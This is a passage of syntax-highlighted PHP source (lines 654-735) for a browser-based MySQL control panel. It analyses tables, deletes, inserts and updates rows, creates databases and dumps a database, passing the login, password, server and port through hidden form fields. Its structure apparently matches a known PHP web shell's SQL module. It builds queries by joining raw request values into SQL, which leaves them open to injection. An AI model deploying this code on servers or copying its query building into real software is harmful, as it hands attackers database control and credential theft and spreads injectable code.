<span class="lineno"> 654</span>       <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tblanalyze&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;ANALYZE TABLE&quot;</span><span class="p">;</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$boxtbl</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">`&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;` ,&quot;</span><span class="p">;}</span> <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
<span class="lineno"> 655</span>       <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;deleterow&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$boxrow_all</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;DELETE * FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;`;&quot;</span><span class="p">;}</span> <span class="k">else</span> <span class="p">{</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$boxrow</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;DELETE * FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;` WHERE&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot; LIMIT 1;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;}</span> <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">);}</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
<span class="lineno"> 656</span>       <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_tbl_act</span> <span class="o">==</span> <span class="s2">&quot;insert&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 657</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_tbl_insert_radio</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 658</span>           <span class="nv">$keys</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno"> 659</span>           <span class="nv">$akeys</span> <span class="o">=</span> <span class="nb">array_keys</span><span class="p">(</span><span class="nv">$sql_tbl_insert</span><span class="p">);</span>
<span class="lineno"> 660</span>           <span class="k">foreach</span> <span class="p">(</span><span class="nv">$akeys</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$keys</span> <span class="o">.=</span> <span class="s2">&quot;`&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;`, &quot;</span><span class="p">;}</span>
<span class="lineno"> 661</span>           <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$keys</span><span class="p">))</span> <span class="p">{</span><span class="nv">$keys</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$keys</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$keys</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">);}</span>
<span class="lineno"> 662</span>           <span class="nv">$values</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno"> 663</span>           <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 664</span>           <span class="k">foreach</span> <span class="p">(</span><span class="nb">array_values</span><span class="p">(</span><span class="nv">$sql_tbl_insert</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nv">$funct</span> <span class="o">=</span> <span class="nv">$sql_tbl_insert_functs</span><span class="p">[</span><span class="nv">$akeys</span><span class="p">[</span><span class="nv">$i</span><span class="p">]])</span> <span class="p">{</span><span class="nv">$values</span> <span class="o">.=</span> <span class="nv">$funct</span><span class="o">.</span><span class="s2">&quot; (&quot;</span><span class="p">;}</span> <span class="nv">$values</span> <span class="o">.=</span> <span class="s2">&quot;&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$funct</span><span class="p">)</span> <span class="p">{</span><span class="nv">$values</span> <span class="o">.=</span> <span class="s2">&quot;)&quot;</span><span class="p">;}</span> <span class="nv">$values</span> <span class="o">.=</span> <span class="s2">&quot;, &quot;</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">;}</span>
<span class="lineno"> 665</span>           <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$values</span><span class="p">))</span> <span class="p">{</span><span class="nv">$values</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$values</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$values</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">);}</span>
<span class="lineno"> 666</span>           <span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;INSERT INTO `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;` ( &quot;</span><span class="o">.</span><span class="nv">$keys</span><span class="o">.</span><span class="s2">&quot; ) VALUES ( &quot;</span><span class="o">.</span><span class="nv">$values</span><span class="o">.</span><span class="s2">&quot; );&quot;</span><span class="p">;</span>
<span class="lineno"> 667</span>           <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;</span>
<span class="lineno"> 668</span>           <span class="nv">$sql_tbl_act</span> <span class="o">=</span> <span class="s2">&quot;browse&quot;</span><span class="p">;</span>
<span class="lineno"> 669</span>         <span class="p">}</span>
<span class="lineno"> 670</span>         <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_tbl_insert_radio</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 671</span>           <span class="nv">$set</span> <span class="o">=</span> <span class="nx">mysql_buildwhere</span><span class="p">(</span><span class="nv">$sql_tbl_insert</span><span class="p">,</span><span class="s2">&quot;, &quot;</span><span class="p">,</span><span class="nv">$sql_tbl_insert_functs</span><span class="p">);</span>
<span class="lineno"> 672</span>           <span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;UPDATE `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;` SET &quot;</span><span class="o">.</span><span class="nv">$set</span><span class="o">.</span><span class="s2">&quot; WHERE &quot;</span><span class="o">.</span><span class="nv">$sql_tbl_insert_q</span><span class="o">.</span><span class="s2">&quot; LIMIT 1;&quot;</span><span class="p">;</span>
<span class="lineno"> 673</span>           <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">)</span> <span class="k">or</span> <span class="k">print</span><span class="p">(</span><span class="nx">mysql_smarterror</span><span class="p">());</span>
<span class="lineno"> 674</span>           <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_ASSOC</span><span class="p">);</span>
<span class="lineno"> 675</span>           <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;</span>
<span class="lineno"> 676</span>           <span class="nv">$sql_tbl_act</span> <span class="o">=</span> <span class="s2">&quot;browse&quot;</span><span class="p">;</span>
<span class="lineno"> 677</span>         <span class="p">}</span>
<span class="lineno"> 678</span>       <span class="p">}</span>
<span class="lineno"> 679</span>       <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;query&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 680</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 681</span>         <span class="k">if</span> <span class="p">((</span><span class="nv">$submit</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_query_result</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$sql_confirm</span><span class="p">))</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_query_error</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query_error</span> <span class="o">=</span> <span class="s2">&quot;Query was empty&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;Error:&lt;/b&gt; &lt;br&gt;&quot;</span><span class="o">.</span><span class="nv">$sql_query_error</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno"> 682</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_query_result</span> <span class="k">or</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_confirm</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_act</span> <span class="o">=</span> <span class="nv">$sql_goto</span><span class="p">;}</span>
<span class="lineno"> 683</span>         <span class="k">if</span> <span class="p">((</span><span class="o">!</span><span class="nv">$submit</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$sql_act</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;form action=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> method=</span><span class="se">\&quot;</span><span class="s2">POST</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;b&gt;&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">((</span><span class="nv">$sql_query</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Do you really want to:&quot;</span><span class="p">;}</span> <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;SQL-Query :&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;textarea name=</span><span class="se">\&quot;</span><span class="s2">sql_query</span><span class="se">\&quot;</span><span class="s2"> cols=</span><span class="se">\&quot;</span><span class="s2">100</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">10</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_act</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">query</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_goto</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_goto</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_confirm</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Yes</span><span class="se">\&quot;</span><span class="s2">&gt; &lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">No</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 684</span>       <span class="p">}</span>
<span class="lineno"> 685</span>       <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$sql_act</span><span class="p">,</span><span class="nv">$acts</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 686</span>         <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno"> 687</span> 
<span class="lineno"> 688</span> 
<span class="lineno"> 689</span> <span class="x">    &lt;table&gt;</span>
<span class="lineno"> 690</span> <span class="x">        &lt;tr&gt;</span>
<span class="lineno"> 691</span> <span class="x">        &lt;td&gt;</span>
<span class="lineno"> 692</span> <span class="x">        &lt;b&gt;Create new table:&lt;/b&gt;</span>
<span class="lineno"> 693</span> <span class="x">        &lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 694</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&gt;</span>
<span class="lineno"> 695</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;sql_act&quot; value=&quot;newtbl&quot;&gt;</span>
<span class="lineno"> 696</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;sql_db&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 697</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 698</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 699</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 700</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 701</span> <span class="x">            &lt;input type=&quot;text&quot; name=&quot;sql_newtbl&quot; size=&quot;20&quot;&gt;</span>
<span class="lineno"> 702</span> <span class="x">            Fields: &lt;input type=&quot;text&quot; name=&quot;sql_field&quot; size=&quot;3&quot;&gt;</span>
<span class="lineno"> 703</span> <span class="x">            &lt;input type=&quot;submit&quot; value=&quot;Create&quot;&gt;</span>
<span class="lineno"> 704</span> <span class="x">        &lt;/form&gt;</span>
<span class="lineno"> 705</span> <span class="x">        &lt;/td&gt;</span>
<span class="lineno"> 706</span> <span class="x">        &lt;td&gt;&lt;b&gt;Dump DB:&lt;/b&gt;</span>
<span class="lineno"> 707</span> <span class="x">        &lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 708</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&gt;</span>
<span class="lineno"> 709</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;sql_act&quot; value=&quot;dump&quot;&gt;</span>
<span class="lineno"> 710</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;sql_db&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 711</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 712</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 713</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 714</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 715</span> <span class="x">            &lt;input type=&quot;text&quot; name=&quot;dump_file&quot; size=&quot;30&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s2">&quot;dump_&quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nv">$sql_db</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d-m-Y-H-i-s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.sql&quot;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 716</span> <span class="x">            &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Dump&quot;&gt;</span>
<span class="lineno"> 717</span> <span class="x">        &lt;/form&gt;</span>
<span class="lineno"> 718</span> <span class="x">        &lt;/td&gt;</span>
<span class="lineno"> 719</span> <span class="x">        &lt;/tr&gt;</span>
<span class="lineno"> 720</span> <span class="x">    &lt;/table&gt;</span>
<span class="lineno"> 721</span> <span class="cp">&lt;?php</span>
<span class="lineno"> 722</span>         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_act</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 723</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;newtbl&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 724</span>           <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 725</span>           <span class="k">if</span> <span class="p">((</span><span class="nb">mysql_create_db</span> <span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">))</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">)))</span> <span class="p">{</span>
<span class="lineno"> 726</span>             <span class="k">echo</span> <span class="s2">&quot;DB </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> has been created with success!&lt;/b&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 727</span>           <span class="p">}</span>
<span class="lineno"> 728</span>           <span class="k">else</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;Can&#39;t create DB </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">.&lt;br&gt;Reason:&lt;/b&gt; &quot;</span><span class="o">.</span><span class="nx">mysql_smarterror</span><span class="p">();</span> <span class="p">}</span>
<span class="lineno"> 729</span>         <span class="p">}</span>
<span class="lineno"> 730</span>         <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;dump&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 731</span>           <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 732</span>             <span class="nv">$diplay</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
<span class="lineno"> 733</span>             <span class="k">echo</span> <span class="s2">&quot;&lt;form method=</span><span class="se">\&quot;</span><span class="s2">GET</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">act</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">sql</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_act</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">dump</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_db</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_login</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_passwd</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_server</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_port</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;b&gt;SQL-Dump:&lt;/b&gt;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 734</span>             <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;DB:&lt;/b&gt; &lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_db</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 735</span>             <span class="nv">$v</span> <span class="o">=</span> <span class="nb">join</span> <span class="p">(</span><span class="s2">&quot;;&quot;</span><span class="p">,</span><span class="nv">$dmptbls</span><span class="p">);</span>
